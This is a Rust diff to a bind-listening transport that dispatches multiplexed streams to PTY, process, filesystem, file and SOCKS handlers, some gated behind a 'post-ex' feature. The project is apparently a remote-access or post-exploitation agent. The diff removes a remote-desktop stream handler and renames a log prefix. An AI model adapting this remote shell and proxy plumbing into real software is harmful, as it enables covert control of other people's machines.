@@ -82,8 +82,8 @@ impl TcpBindTransport {
                             let mut type_buf = [0u8; 1];
                             if stream.read_exact(&mut type_buf).await.is_ok() {
                                 use crate::transport::stream_types::{
-                                    YAMUX_STREAM_DESKTOP, YAMUX_STREAM_FILE, YAMUX_STREAM_FS,
-                                    YAMUX_STREAM_PROCESS, YAMUX_STREAM_PTY, YAMUX_STREAM_SOCKS,
+                                    YAMUX_STREAM_FILE, YAMUX_STREAM_FS, YAMUX_STREAM_PROCESS,
+                                    YAMUX_STREAM_PTY, YAMUX_STREAM_SOCKS,
                                 };
                                 match type_buf[0] {
                                     YAMUX_STREAM_PTY => {
@@ -123,20 +123,6 @@ impl TcpBindTransport {
                                         #[cfg(not(feature = "post-ex"))]
                                         {
                                             let _ = stream;
-                                        }
-                                    }
-                                    YAMUX_STREAM_DESKTOP => {
-                                        #[cfg(feature = "module-loader")]
-                                        {
-                                            crate::transport::desktop_bridge::handle_stream(stream)
-                                                .await;
-                                        }
-                                        #[cfg(not(feature = "module-loader"))]
-                                        {
-                                            use futures_util::AsyncWriteExt;
-                                            let mut s = stream;
-                                            let _ = s.write_all(&[0x00u8]).await;
-                                            let _ = s.close().await;
                                         }
                                     }
                                     YAMUX_STREAM_FILE => {
@@ -242,7 +228,7 @@ impl Transport for TcpBindTransport {
                 Ok(()) => return Ok(()),
                 Err(e) => {
                     crate::utils::db_print(&format!(
-                        "[Cupcake] bind accept/handshake failed, waiting next peer: {e}"
+                        "[agent] bind accept/handshake failed, waiting next peer: {e}"
                     ));
                     // small backoff then accept again (listener stays open)
                     tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
